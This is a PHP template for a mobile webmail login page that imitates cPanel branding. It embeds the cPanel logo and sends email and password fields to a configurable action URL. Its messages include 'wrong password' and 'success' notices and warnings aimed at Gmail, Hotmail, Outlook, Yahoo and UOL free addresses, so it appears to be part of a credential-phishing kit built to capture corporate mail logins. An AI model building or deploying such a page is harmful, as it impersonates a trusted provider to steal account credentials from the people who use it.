<?php
declare(strict_types=1);

/** @var array $config */
/** @var string $locale */
/** @var string $statusMessage */
/** @var bool $statusVisible */
/** @var string $cpanelCss */
/** @var string $cpanelFonts */
/** @var string $cpanelLogo */
/** @var string $favicon */
/** @var string $year */

$cpanelIcon = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmZmIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmZmIi8+PC9nPjwvc3ZnPg==';
?>
<!DOCTYPE html>
<html lang="<?= e(str_replace('_', '-', $locale)) ?>" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate">
    <title><?= e($config['site_title']) ?></title>
    <link rel="shortcut icon" href="<?= e($favicon) ?>" type="image/x-icon">
    <link href="<?= e($cpanelFonts) ?>" rel="stylesheet" type="text/css">
    <link href="<?= e($cpanelCss) ?>" rel="stylesheet" type="text/css">
    <link href="assets/login-mobile.css?v=1" rel="stylesheet" type="text/css">
    <link href="assets/webmail-layout.css?v=1" rel="stylesheet" type="text/css">
</head>
<body class="wm wm-mobile">

<div id="login-wrapper" class="group">
    <div class="wrapper">
        <div id="notify">
            <div id="login-status" class="error-notice" style="<?= $statusVisible ? 'visibility: visible' : 'visibility: hidden' ?>">
                <div class="content-wrapper">
                    <div id="login-detail">
                        <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                        <div id="login-status-message"><?= e($statusMessage) ?></div>
                    </div>
                </div>
            </div>
        </div>

        <div id="content-container">
            <div id="login-container">
                <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="<?= e($cpanelLogo) ?>" alt="logo">
                    </div>
                    <div id="login-sub">
                        <div id="forms">
                            <form novalidate id="login_form" action="<?= e($config['login_action']) ?>" method="post">
                                <div class="input-req-login"><label for="user"><?= e(msg('email_label', $locale)) ?></label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="<?= e(msg('email_ph', $locale)) ?>" class="std_textbox" type="email" autocomplete="username" tabindex="1" required>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass"><?= e(msg('password_label', $locale)) ?></label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="<?= e(msg('password_ph', $locale)) ?>" class="std_textbox" type="password" tabindex="2" autocomplete="current-password" required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3"><?= e(msg('login_btn', $locale)) ?></button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
window.WEBMAIL_MESSAGES = <?= json_encode([
    'invalid_login'    => msg('invalid_login', $locale),
    'invalid_email'    => msg('invalid_email', $locale),
    'invalid_domain'   => msg('invalid_domain', $locale),
    'invalid_password' => msg('invalid_password', $locale),
    'wrong_password'   => msg('wrong_password', $locale),
    'warn_gmail'       => msg('warn_gmail', $locale),
    'warn_hotmail'     => msg('warn_hotmail', $locale),
    'warn_outlook'     => msg('warn_outlook', $locale),
    'warn_yahoo'       => msg('warn_yahoo', $locale),
    'warn_uol_free'    => msg('warn_uol_free', $locale),
    'connerror'        => msg('connerror', $locale),
    'success'          => msg('success', $locale),
    'authenticating'   => msg('authenticating', $locale),
    'no_username'      => msg('no_username', $locale),
    'network_error'    => msg('network_error', $locale),
], JSON_UNESCAPED_UNICODE) ?>;
window.IS_LOGOUT = <?= !empty($isLogout) ? 'true' : 'false' ?>;
</script>
<script src="assets/login.js?v=3"></script>

<div class="copyright wm-mobile-copy">
    <?= e(sprintf(msg('copyright', $locale), $year)) ?>
</div>

</body>
</html>
